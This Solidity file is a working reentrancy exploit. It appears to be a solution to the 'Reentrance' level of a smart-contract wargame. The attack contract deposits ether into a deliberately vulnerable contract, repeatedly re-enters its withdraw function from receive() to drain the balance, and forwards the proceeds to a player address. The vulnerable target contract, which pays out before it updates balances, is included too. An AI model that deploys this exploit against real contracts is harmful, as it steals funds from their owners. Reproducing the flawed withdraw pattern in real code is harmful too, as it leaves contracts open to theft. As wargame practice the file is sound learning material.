// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract PeeElephant {
    address payable targetAddress;
    Reentrance target;
    address payable player;

    constructor(address _target, address _player) payable {
        targetAddress = payable(_target);
        target = Reentrance(targetAddress);
        player = payable(_player);
        uint256 depositAmount = msg.value;
        donatePwn();
        target.withdraw(depositAmount);
    }

    function withdrawEther() external returns (bool) {
        require(player == msg.sender, "only player can withdraw");
        uint256 currentBal = address(this).balance;
        (bool sent, ) = player.call{value: currentBal}("");
        require(sent, "Failed to send Ether");
        return sent;
    }

    function donatePwn() public payable {
        target.donate{value: msg.value}(address(this));
    }

    receive() external payable {
        //get balance of contract
        uint256 prize = address(targetAddress).balance;
        uint256 myDeposit = target.balanceOf(address(this));
        if (prize == 0) {
            return;
        }
        if (prize < myDeposit) {
            target.withdraw(prize);
        }
        if (prize >= myDeposit) {
            target.withdraw(myDeposit);
            player.transfer(address(this).balance);
        }
    }
}

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    //lets call this function in our fallback function
    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            } //this is not state-reverting error checkin, thats where this whole thing fucks up
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
